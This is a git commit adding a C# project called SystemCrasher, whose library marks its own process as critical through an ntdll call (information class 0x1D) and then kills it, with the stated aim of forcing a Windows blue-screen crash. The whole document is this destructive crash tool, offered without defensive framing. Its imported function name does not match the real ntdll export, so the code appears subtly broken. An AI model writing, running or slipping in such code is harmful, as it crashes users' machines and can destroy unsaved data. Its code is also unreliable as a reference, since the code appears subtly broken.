4920f2738aa3dbc9009ec3c2e9dab49472d0b830
Vadim Shirokih <shirokihb@mail.ru>
2021-02-15 12:11:54 +0300

    Добавьте файлы проекта.

---
+++ SystemCrasher/Program.cs
@@ -0,0 +1,14 @@
+﻿using System;
+using andkfox.bsod;
+
+namespace SystemCrasher
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            bsod.StartBSOD();
+            Console.WriteLine("Tell th computer bye!");
+        }
+    }
+}
---
+++ andkfox.bsod/bsod.cs
@@ -0,0 +1,22 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Text;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+
+namespace andkfox.bsod
+{
+    public static class bsod
+    {
+        [DllImport("ntdll.dll")]
+        private static extern int SetInfProcess(IntPtr proces, int prcClass, ref int prcValue, int length);
+
+        public static void StartBSOD()
+        {
+            Process.EnterDebugMode();
+            int st = 1;
+            SetInfProcess(Process.GetCurrentProcess().Handle, 0x1D, ref st, sizeof(int));
+            Process.GetCurrentProcess().Kill();
+        }
+    }
+}
